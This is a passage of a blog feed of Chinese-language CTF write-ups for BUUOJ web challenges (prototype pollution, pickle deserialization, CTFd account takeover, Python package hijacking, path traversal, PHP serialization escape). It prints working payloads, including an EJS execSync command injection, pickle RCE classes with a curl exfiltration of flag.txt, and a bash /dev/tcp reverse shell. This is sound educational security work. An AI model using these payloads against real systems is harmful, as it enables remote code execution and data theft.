String()里添加方法或属性，继承它的'123'会添加相同的方法属性。而JavaScript在访问某对象属性或方法时是从原型链起始Object()开始查找，直到最后的目标。因此假设我们为Object()添加了个toUppercase()方法，最后'123'.toUppercase()就会优先调用Object()的toUppercase()，这样toUppercase()就被我们污染了，这种攻击方法就叫原型链污染。注意一点，原型链污染的时候我们需要传入JSON数据，即发包的Content-type要变成application/json，否则__proto__不会覆盖。 回到题目，下面的问题是我们的输入怎样污染呢？注意到在route('/')的时候有点东西： 1234567router.get(&#x27;/&#x27;, function (req, res) &#123; if (!req.session.user) &#123; res.redirect(&#x27;/login&#x27;); &#125; res.outputFunctionName = undefined; res.render(&#x27;index&#x27;, data = &#123;&#x27;user&#x27;: req.session.user.user&#125;);&#125;); 为什么多出来个outputFunctionName？本题的渲染引擎用的ejs，貌似在刚才的参考文章里提到可以造成RCE。 所以，我们抄一下RCE的Payloada; return global.process.mainModule.constructor._load('child_process').execSync('whoami');。发包吧： 123456789101112131415POST /action HTTP/1.1Host: 56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 146Origin: http://56419387-98b4-44ea-84fc-e96a717536a1.node3.buuoj.cnConnection: closeReferer: http://54830c3c-4435-4ff0-814f-a9cfc97ec6d0.node3.buuoj.cn/Cookie: _ga=GA1.2.744187123.1582874453; session=s%3AuujbI4q6GPRCu7MQpsxrcvFqt0tTzzAV.jGfKfFz5gfEczv2Yw1LCl1nHqwMEsY2k6Zup91j0X88Upgrade-Insecure-Requests: 1&#123;&quot;lua&quot;:&quot;aaa&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;); //&quot;&#125;&#125; 提交后刷新页面即可得到flag。 flag{3fa89b5f-528d-434b-9ada-e93a864b2969}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"},{"name":"原型链污染","slug":"原型链污染","permalink":"http://tiaonmmn.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"BUUOJ刷题-Web-Products Manager","slug":"BUUOJ刷题-Web-Products-Manager","date":"2020-03-01T12:14:48.000Z","updated":"2020-03-01T13:44:08.950Z","comments":true,"path":"2020/03/01/BUUOJ刷题-Web-Products-Manager/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/01/BUUOJ%E5%88%B7%E9%A2%98-Web-Products-Manager/","excerpt":"","text":"FaceBook CTF 2019的Products Manager。给了源码，猜测是SQL注入的题。 开题允许我们查看Top 5的Products，添加自己的商品，或者查看其他人的商品详情，但是需要输入密码。那么盲猜flag在某个商品详情里面。 看一下源码，db.php告诉我们flag在facebook商品里面，我们需要拿到它的密码。db.php包含数据区读写操作，所有的SQL语句都使用了prepare，看来SQL注入废了。我们重点看一下view.php。 123456789101112131415161718192021function handle_post() &#123; global $_POST; $name = $_POST[&quot;name&quot;]; $secret = $_POST[&quot;secret&quot;]; if (isset($name) &amp;&amp; $name !== &quot;&quot; &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123; if (check_name_secret($name, hash(&#x27;sha256&#x27;, $secret)) === false) &#123; return &quot;Incorrect name or secret, please try again&quot;; &#125; $product = get_product($name); echo &quot;&lt;p&gt;Product details:&quot;; echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&#x27;name&#x27;]) . &quot;&lt;/li&gt;&quot;; echo &quot;&lt;li&gt;&quot; . htmlentities($product[&#x27;description&#x27;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;; &#125; return null;&#125; 过了check_name_secret()后会调用get_product()获得商品信息。问题来了，get_product()里的SQL语句是这么写的SELECT name, description FROM products WHERE name = ?，而name在MySQL中是char(64)类型，对MySQL而言，char和varchar类型有个奇怪的特性。 All MySQL collations are of type PAD SPACE. This means that all CHAR, VARCHAR, and TEXT values are compared without regard to any trailing spaces. “Comparison” in this context does not include the LIKE pattern-matching operator, for which trailing spaces are significant. https://dev.mysql.com/doc/refman/5.7/en/char.html 使用=比较的时候MySQL会忽略掉字符串后面的空格，所以如果我们传入'facebook '，SQL语句变成select name,description from products where name='facebook ';对MySQL而言，等同于select name,description from products where name='facebook';，所以，我们在add.php的handle_post()里传入'facebook '，会先进行get_product()，而get_product()错误的返回了'facebook'的数据，因此可以通过重名的检查从而插入了一条'facebook '的数据。当我们view的时候，会过check_name_secret()，仍然使用=比较：SELECT name FROM products WHERE name = ? AND secret = ?，MySQL认为'facebook'与'facebook '是相同的，因此secret为我们设置的值时select正常返回，这样就可以绕过facebook的secret了。但是get_product()的时候只会返回'facebook'的结果，不会返回'facebook '的结果。 所以，Add一个'facebook '的Product，secret任意设置。然后view，名称填'facebook'，secret为刚才设置的值，即可拿到flag。 flag{246d6062-dca6-4de4-adbb-5f5a3770b9e6}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"BUUOJ刷题-Web-HappyCTFd","slug":"BUUOJ刷题-Web-HappyCTFd","date":"2020-03-01T02:43:44.000Z","updated":"2020-03-01T12:56:44.985Z","comments":true,"path":"2020/03/01/BUUOJ刷题-Web-HappyCTFd/","link":"","permalink":"http://tiaonmmn.github.io/2020/03/01/BUUOJ%E5%88%B7%E9%A2%98-Web-HappyCTFd/","excerpt":"","text":"BUUOJ上V&amp;N的招新题，涉及到CTFd的一个洞CVE-2020-7245。 开题发现就是个CTFd的页面，随便注册后发现啥都没有，只有个admin用户，看来我们需要得到admin的权限。 之前看CTFd的Release Notes时注意到在2.2.3版本有个security fix，修了个任意用户接管的洞。那就看一下2.2.3和2.2.2版本的diff，到底改了什么。 核心内容是auth.py，看一下register()函数 2.2.21234567891011121314def register(): errors = get_errors() if request.method == &quot;POST&quot;: name = request.form[&quot;name&quot;] email_address = request.form[&quot;email&quot;] password = request.form[&quot;password&quot;] name_len = len(name) == 0 names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first() emails = ( Users.query.add_columns(&quot;email&quot;, &quot;id&quot;) .filter_by(email=email_address) .first() ) 2.2.2版本下验证是否已存在用户时通过request.form直接取值，但是在后面又来了段 2.2.212345678910else: with app.app_context(): user = Users( name=name.strip(), email=email_address.lower(), password=password.strip(), ) db.session.add(user) db.session.commit() db.session.flush() 写入数据库的时候name经过了strip()，所以我们在注册的时候写admin就会造成实际写入库的用户名是admin。再回头看reset_password() 2.2.21234567891011if request.method == &quot;POST&quot;: user = Users.query.filter_by(name=name).first_or_404() user.password = request.form[&quot;password&quot;].strip() db.session.commit() log( &quot;logins&quot;, format=&quot;[&#123;date&#125;] &#123;ip&#125; - successful password reset for &#123;name&#125;&quot;, name=name, ) db.session.close() return redirect(url_for(&quot;auth.login&quot;)) 查询用户的时候直接使用库里的name字段，当我们注册admin （n个空格）的时候重置密码，实际上重置的是admin用户的密码。这样我们就可以任意登录admin用户了。 总结一下，攻击流程如下： 注册用户为admin （后面加上空格） 重置密码 在2.2.3版本下，register()函数会首先进行name的strip() 2.2.31234567891011121314def register(): errors = get_errors() if request.method == &quot;POST&quot;: name = request.form.get(&quot;name&quot;, &quot;&quot;).strip() email_address = request.form.get(&quot;email&quot;, &quot;&quot;).strip().lower() password = request.form.get(&quot;password&quot;, &quot;&quot;).strip() name_len = len(name) == 0 names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first() emails = ( Users.query.add_columns(&quot;email&quot;, &quot;id&quot;) .filter_by(email=email_address) .first() ) 我们没办法制造出重名的用户，就没办法利用了。 回到题目，BUUOJ里给了邮件服务器mail.buuoj.cn，注册的时候填给的邮箱就行。登录成admin后会发现有一道Hidden的题，下载附件就能看到flag了。 flag{d993d0f0-b9b7-4cb3-9a58-e5f1b1304c1c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"CTFd","slug":"CTFd","permalink":"http://tiaonmmn.github.io/tags/CTFd/"},{"name":"Flask","slug":"Flask","permalink":"http://tiaonmmn.github.io/tags/Flask/"}]},{"title":"BUUOJ刷题-Web-Pickle-Store","slug":"BUUOJ刷题-Web-Pickle-Store","date":"2020-02-28T06:52:57.000Z","updated":"2020-03-01T11:55:32.602Z","comments":true,"path":"2020/02/28/BUUOJ刷题-Web-Pickle-Store/","link":"","permalink":"http://tiaonmmn.github.io/2020/02/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Pickle-Store/","excerpt":"watevCTF 2019的Pickle Store。（注，pickle有酸黄瓜的意思） 开题后是个购买网站，Burp抓一下包，在Cookie中有些东西。","text":"watevCTF 2019的Pickle Store。（注，pickle有酸黄瓜的意思） 开题后是个购买网站，Burp抓一下包，在Cookie中有些东西。 Coookies里给了串像是Base64的东西，解出来发现是一些乱码b'\\x80\\x03&#125;q\\x00(X\\x05\\x00\\x00\\x00moneyq\\x01M\\xf4\\x01X\\x07\\x00\\x00\\x00historyq\\x02]q\\x03X\\x10\\x00\\x00\\x00anti_tamper_hmacq\\x04X \\x00\\x00\\x00aa1ba4de55048cf20e0a7a63b7f8eb62q\\x05u.'。有明文字符串，那么会是什么东西？抬头看看标题，Pickle Store，会不会是Python pickle数据？pickle.loads解一下果然出东西了&#123;'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'&#125;。 很明显，我们把money改了就可以任意购买东西，但是最后那个扎眼的anti_tamper_hmac是什么鬼。强行修改money后pickle.dumps，再Base64回去，换掉Cookies，果然money没变化。 下面研究一下HMAC，不过在研究HMAC之前，我们要想到一个问题，他竟然敢用Pickle？Pickle很容易RCE的，例如这里。照着写个class好了 1234567import pickleimport osimport base64class evil(object): def __reduce__(self): return (os.system,(&#x27;ls&#x27;,))print(base64.b64encode(pickle.dumps(evil()))) 把Cookies替换了，发现500了。我们把ls换成sleep 10看看。发现确实是停了10s才返回500。我们的命令成功执行了，没回显，那就弹shell了。BUUOJ下弹shell有点难，试一下这个环境有没有curl吧，配合HTTPRequestBin。发现可行，同时flag.txt在当前目录下。 1234567import pickleimport base64import osclass evil(object): def __reduce__(self): return (os.system,(&#x27;curl -X POST --data &quot;test=`cat flag.txt`&quot; http://http.requestbin.buuoj.cn/19tec0n1&#x27;,))print(base64.b64encode(pickle.dumps(evil()))) 就拿到flag了。 flag{83e228ed-71f1-4a62-834e-23d9ea42b430}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Python","slug":"Python","permalink":"http://tiaonmmn.github.io/tags/Python/"},{"name":"Pickle","slug":"Pickle","permalink":"http://tiaonmmn.github.io/tags/Pickle/"}]},{"title":"Balsn-CTF-2019-Image-and-words","slug":"Balsn-CTF-2019-Image-and-words","date":"2020-02-06T04:12:49.000Z","updated":"2020-02-06T13:40:10.010Z","comments":true,"path":"2020/02/06/Balsn-CTF-2019-Image-and-words/","link":"","permalink":"http://tiaonmmn.github.io/2020/02/06/Balsn-CTF-2019-Image-and-words/","excerpt":"","text":"Balsn CTF 2019的Image and words，当时0解。 给了个Zip文件，里面有完整的环境。先看一下run.sh： 123456gunicorn \\ --bind &quot;$default_bind&quot; \\ --worker-class uvicorn.workers.UvicornWorker \\ --workers 1 \\ --umask 007 \\ main:server gunicorn起的服务，只允许一个工作线程？有点意思，还不知道什么用。 main.py是主服务了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env python3from pathlib import Pathimport subprocessimport reimport secretsfrom starlette.applications import Starlettefrom starlette.responses import HTMLResponsefrom starlette.background import BackgroundTaskfrom starlette.staticfiles import StaticFilesimport configimport text2imageDEFAULT_RESPONSE = HTMLResponse(&#x27;&#x27;&#x27;&lt;h1&gt;Images and Words&lt;/h1&gt;Convert text to a png file!&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload text&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&#x27;&#x27;&#x27;)server = Starlette(debug=config.DEBUG)config.UPLOAD_DIR.mkdir(mode=0o700, exist_ok=True)server.mount(&#x27;/static&#x27;, app=StaticFiles(directory=str(config.UPLOAD_DIR)))def sanitize_filename(dangerous_filename): print(len(dangerous_filename)) res = re.match(r&#x27;^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$&#x27;, dangerous_filename) safe_filename = secrets.token_urlsafe(32)[:32] if res is None else dangerous_filename return safe_filenamedef render(filename): src = config.UPLOAD_DIR / filename with open(src, &#x27;r&#x27;) as f: text = f.read() src.unlink() dst = config.UPLOAD_DIR / (filename + &#x27;.png&#x27;) with open(dst, &#x27;wb&#x27;) as f: text2image.render(text, f)@server.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request): if request.method == &#x27;POST&#x27;: form = await request.form() if not form.get(&#x27;file&#x27;): return DEFAULT_RESPONSE filename = sanitize_filename(form[&#x27;file&#x27;].filename[:config.MAX_FILENAME_LEN]) data = form[&#x27;file&#x27;].file.read(config.MAX_TEXT_LEN) with open(config.UPLOAD_DIR / filename, &#x27;wb&#x27;) as f: f.write(data) return HTMLResponse(f&#x27;&#x27;&#x27;Your file will soon be available in &lt;a href=&quot;static/&#123;filename&#125;.png&quot;&gt;static/&#123;filename&#125;.png&lt;/a&gt;&#x27;&#x27;&#x27;, background=BackgroundTask(render, filename)) return DEFAULT_RESPONSE Starlette框架起的一个TXT转PNG的Web服务。我们上传文件，判断上传文件名非危险文件名后read()读取，删除原文件，调用text2image渲染，在static目录下生成随机文件名的PNG结果文件。文件名利用secrets.token_urlsafe来生成。由此可知，本题为Python 3.6以上环境。（secrets模块为Python 3.6引入的标准库）上传的目录为png目录（从config.py中来）。 看起来没什么问题，再看看text2image是个什么东西，用这个改的，没啥意思。 到此为止，没发现问题。下面我们可能要考虑一下Starlette框架的问题了，但在此之前，再看一下requirements.txt，发现有个pypng库。而text2image.py里也出现了import png，png对应着pypng库。但是我们上传与生成的文件都放在png目录下，这就有问题了。看一下文档，Python使用Packages的概念来进行功能管理。Python3起存在两种Package，一个叫Regular Package，一个叫Namespace Package。Regular Package就是一个包含有__init__.py的文件夹。Python在import的时候默认使用import path查找Package，import path默认情况下跟随sys.path，而当前文件夹为sys.path的第一项内容。Python在import Package的时候会自动执行包的__init__.py。 好了，很明显，如果我们提前写入一个__init__.py，就可以覆盖掉pypng的png Package，进而RCE。但是有个问题，本题是用Gunicorn起的，Gunicorn采用Pre-fork模型，pypng包已经加载完成了。所以我们需要一种方式让Gunicorn重新启动main:server，加载我们恶意的png Package。 注意到run.sh里Gunicorn调用时没有设置超时，默认情况下Gunicorn超时设置30秒，如果我们可以让worker卡住30秒以上，那么Gunicorn就会重启worker，这时就会加载恶意的png Package。 回到main.py，我们发现有两个点可能造成DOS，一个是sanitize_filename()那里用了个很长的正则表达式，可能造成ReDOS，还有一个是render()那里上传时文件过大就可能造成DOS。但是又用getsize()限制了大小，此路不通。 我们看一下那个正则，^[\\.a-zA-Z0-9_-]([\\.a-zA-Z0-9_-]+)*$，匹配a-z A-Z 0-9 _ -这些符号，关键在后面的()分组里使用了*贪婪模式，尽可能的匹配字符，字符一旦多了就会处理缓慢，例如我们提交一个aaaaaaaaaaaaaaaaaaaa!，在regex101.com上匹配这个正则会报Catastrophic backtracking。 我们现在有办法让worker停下来30秒了，还有一个问题没解决：我们没法上传png文件夹，只能上传单个文件。再回到main.py里，发现render()函数中读取文本内容用的是read()函数，没有其他参数，read()完成后会unlink()文件。如果我们让read()异常，就会直接跳出这个函数，unlink()就不能起作用了。题目中read()没加其他参数，那么默认编码是UTF-8，遇到编码错误就会报异常。我们上传一个非UTF-8编码的文件就可以了。 本题所有难点全部解决，下面就是操作了： 首先生成我们要执行的__init__.py。为方便起见，不分行写了，并且弹一个shell出来。__import__('os').system('bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1 ')。 然后需要将其转成非UTF-8编码的文件，我们选个GB2312吧（读写中文文本时应该都没少被它折磨过）。但是有个问题，Python3脚本默认使用UTF-8编码，如果我们改变文件编码，需要在py文件头加一句# coding=GB2312声明一下，并且插入确实与UTF-8字符编码不相同的字符，例如中文。因此__init__.py实际内容为： 123# coding&#x3D;GB2312#测试__import__(&#39;os&#39;).system(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8888 0&gt;&amp;1 &#39;) 用iconv转码iconv -f utf-8 -t gb2312 &lt; payload.py &gt; __init__.py 写个脚本上传： 1234import requestss=requests.session()s.post(&#x27;http://127.0.0.1:8080/&#x27;,files=&#123;&#x27;file&#x27;:(&#x27;__init__.py&#x27;,open(&#x27;__init__.py&#x27;,&#x27;rb&#x27;).read())&#125;)s.post(&#x27;http://127.0.0.1:8080&#x27;,files=&#123;&#x27;file&#x27;:(&#x27;a*31&#x27;+&#x27;!&#x27;,b&#x27;&#x27;)&#125;) 收shell。 flag{b65583ad-a2ba-4473-91fa-0b1d38f6889f}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJ刷题-Web-Buggy-Net","slug":"BUUOJ刷题-Web-Buggy-Net","date":"2019-12-07T11:32:44.000Z","updated":"2019-12-11T15:22:42.322Z","comments":true,"path":"2019/12/07/BUUOJ刷题-Web-Buggy-Net/","link":"","permalink":"http://tiaonmmn.github.io/2019/12/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Buggy-Net/","excerpt":"HITCON 2019的Buggy_Net，少见的C#题啊。&#x1f34a;大大的题。 先说一下，flag在C:\\FLAG.txt里。 给了源码：","text":"HITCON 2019的Buggy_Net，少见的C#题啊。&#x1f34a;大大的题。 先说一下，flag在C:\\FLAG.txt里。 给了源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://bootswatch.com/4/sketchy/bootstrap.min.css&quot;&gt; &lt;style type=&quot;text/css&quot;&gt; .form-control-borderless &#123; border: none; &#125; .form-control-borderless:hover, .form-control-borderless:active, .form-control-borderless:focus &#123; border: none; outline: none; box-shadow: none; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&#x27;container&#x27;&gt; &lt;br&gt; &lt;br&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;h1&gt;&lt;font style=&quot;font-size: 200%&quot;&gt;Buggy .Net&lt;/font&gt;&lt;/h1&gt; &lt;/div&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;i&gt; Here is the source for you: &lt;a href=&#x27;Default.txt&#x27;&gt;Default.txt&lt;/a&gt;&lt;/i&gt; &lt;/div&gt; &lt;br&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;div class=&quot;col-12 col-md-10 col-lg-12&quot;&gt; &lt;form class=&quot;card card-sm&quot; method=&quot;POST&quot; action=&quot;&quot;&gt; &lt;div class=&quot;card-body row no-gutters align-items-center&quot;&gt; &lt;div class=&quot;col&quot;&gt; &lt;input class=&quot;form-control form-control-lg form-control-borderless&quot; type=&quot;text&quot; name=&quot;filename&quot; placeholder=&quot;filename...&quot;&gt; &lt;/div&gt; &lt;div class=&quot;col-auto&quot;&gt; &lt;button class=&quot;btn btn-lg btn-success&quot; type=&quot;submit&quot;&gt;Send&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;br&gt; &lt;br&gt; &lt;div class=&#x27;row justify-content-center&#x27;&gt; &lt;h3&gt;&lt;font color=&#x27;red&#x27;&gt;&lt;% bool isBad = false; try &#123; if ( Request.Form[&quot;filename&quot;] != null ) &#123; isBad = Request.Form[&quot;filename&quot;].Contains(&quot;..&quot;) == true; &#125; &#125; catch (Exception ex) &#123; &#125; try &#123; if (!isBad) &#123; Response.Write(System.IO.File.ReadAllText(@&quot;C:\\inetpub\\wwwroot\\&quot; + Request.Form[&quot;filename&quot;])); &#125; &#125; catch (Exception ex) &#123; &#125;%&gt;&lt;/font&gt;&lt;/h3&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 1. Deploy 非常少见的ASP.NET的题，我们先研究一下这题如何本地复现。好在就一个文件，倒也方便。 先收集一下信息，根据返回头，发现用的是IIS 10和ASP.NET 4.0。IIS 10跟着的是Windows Server 2016。那我们就搭一个好了，不难，注意要选那个桌面体验，Server Core版本没桌面环境，对这道题而言纯属自找麻烦。 VS也是必要的，Rider也行。我用VS2019了。 注意，不能用ASP.NET Core的项目，ASP.NET Core跟ASP.NET 4差了很多，.Net Framework版本要选4.0。 在VS里新建Web窗体，把代码粘贴过去，编译。 下一步部署，我直接复制文件后总会有一些奇奇怪怪的问题，所以用微软推荐的Web Deploy方式部署。参考这个，一步步照做就好了。最后记得改下默认文档，要不就把新建的Web窗体重命名成default.aspx。 然后准备远程调试，参考这个，照做。 2. Audit 回过头看源码，核心在这里： 12345678910111213141516bool isBad = false;try &#123; if ( Request.Form[&quot;filename&quot;] != null ) &#123; isBad = Request.Form[&quot;filename&quot;].Contains(&quot;..&quot;) == true; &#125;&#125; catch (Exception ex) &#123; &#125; try &#123; if (!isBad) &#123; Response.Write(System.IO.File.ReadAllText(@&quot;C:\\inetpub\\wwwroot\\&quot; + Request.Form[&quot;filename&quot;])); &#125;&#125; catch (Exception ex) &#123;&#125; 从Request.Form取filename的值，如果包含..则判断不过，否则在页面上显示文件内容。用C:\\inetpub\\wwwroot\\加上刚才的filename值拼接而成。我们的目标是C:\\FLAG.txt，但是目录在C:\\inetpub\\wwwroot，因此我们确实需要..\\或../来跳到上层目录。 然后注意一个问题，这里它使用了try来处理异常，那么如果我们让Request.Form['filename']取值的时候发生异常，而它又实际上具有合法的值， 就可以绕过了。 那么，我们的思路无外乎两点： 从Request.Form入手，研究Request.Form的取值是否有问题 从System.IO.File.ReadAllText入手，研究传入参数是否有问题 先从Request.Form入手吧，System.IO.File.ReadAllText是个系统函数，应该没有太大问题。 3. Request.Form 先看一下官方文档，Form是HttpRequest对象的一个属性，当请求的Content-Type为\"application/x-www-form-urlencode\"或者\"multipart/form-data\"时会被填充。 然后似乎也没什么信息了。那我们搜一下ASP.NET 4 request.form，然后发现了相当有趣的结果：A potentially dangerous Request Form value was detected，这篇文章说自己在提交完整HTML的代码时发生错误，然后找到了这个，ASP.NET 1.1和2会自动阻止任何未经编码的HTML文本提交。那么ASP.NET 4呢？我们找一下ASP.NET 4的change log，找到了这个，ASP.NET 4开始会对所有请求进行验证。我们来验证一下。 把源码中C#代码段改成这样： 123 那么，有没有可能bypass？找到了这个。 flag{301f80db-8086-4fe8-a2ec-fe92c88bb6e3}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"C#","slug":"C","permalink":"http://tiaonmmn.github.io/tags/C/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"ASP.NET","slug":"ASP-NET","permalink":"http://tiaonmmn.github.io/tags/ASP-NET/"}]},{"title":"BUUOJ刷题-Web-easy_serialize_php","slug":"BUUOJ刷题-Web-easy-serialize-php","date":"2019-12-03T00:56:28.000Z","updated":"2019-12-07T11:18:48.798Z","comments":true,"path":"2019/12/03/BUUOJ刷题-Web-easy-serialize-php/","link":"","permalink":"http://tiaonmmn.github.io/2019/12/03/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-serialize-php/","excerpt":"安洵杯 2019的题。 打开就给了我们源码：","text":"安洵杯 2019的题。 打开就给了我们源码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 代码中提示我们要去看phpinfo，发现有如下disable_functions：pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,，而且auto_append_file里有个d0g3_f1ag.php，应该就是我们的目标文件了。 回来看源码，filter()过滤了php flag php5 php4 fllg，但是没有过滤phtml？注意到代码中一行很刺眼的extract($_POST);，变量覆盖？这意味着我们可以覆盖掉\\(\\_SESSION了。然后filter(serialize(\\)_SESSION))，如果调用函数为show_image，那么再serialize，file_get_contents序列化后的img的值。 好了，去找一个序列化的类吧。然后发现，似乎没有，d0g3_f1ag.php没法读，那个show_image是个摆设，只能读guest_img.png。然后我们发现个问题，为什么要多此一举的来一行$_SESSION['function']=$function;，而且后面完全没用到？\\(function是GET传参而来的，我们如何覆盖\\)_SESSION都不会影响接下来的流程。只能说明$_SESSION[function]有问题。我们本地测试一下。 明显的看到，我们的_SESSION[function]原封不动的注入到序列化的结果了。这样，我们就可以任意修改serialize的结果了。 回到题目，我们的目标是什么？通过file_get_contents()去读其他文件。\\(userinfo[&#39;img&#39;]由unserialize() filter过的SESSION数组来的，而我们可控这个序列化的结果，那么我们需要让\\)userinfo['img']变成其他的内容，目前我们的目标是ZDBnM19mMWFnLnBocA==（d0g3_f1ag.php）。 我们先看一下上面那张图，当_SESSION[function]赋值成123456789时序列化（未f=过滤）的结果是a:2:&#123;s:8:\"function\";s:9:\"123456789\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;，然后我们在123456789后面加个双引号试图截断，结果变成了：a:2:&#123;s:8:\"function\";s:11:\"123456789\"\u001d\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;，中间那个奇怪的符号叫分组符(0x1d)。因此，加上双引号是没法截断序列的。那咋办？ 然后我们注意到两个个问题，一是$_SESSION['user']被赋值成guest后就再也没它事了，二是filter()函数调用，是直接对序列化的结果filter，这就有可能造成序列化的结果完全改变。 看起来似乎没什么问题，那么如果我们加入被过滤的词呢？ 然后报错了，我们来观察一下filter过后的序列化字符串：a:3:&#123;s:4:\"user\";s:4:\"\";s:8:\"function\";s:7:\"123456\"\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;（Base64值为YTozOntzOjQ6InVzZXIiO3M6NDoiIjtzOjg6ImZ1bmN0aW9uIjtzOjc6IjEyMzQ1NiIiO3M6MzoiaW1nIjtzOjIwOiJaM1ZsYzNSZmFXMW5MbkJ1Wnc9PSI7fQ==），user字段的值为：\";s:8:\"function\";s:7:\"123456\"，PHP序列化一定会以双引号作为开始结束的标志，所以，我们实际上是逃逸了一个双引号出来。 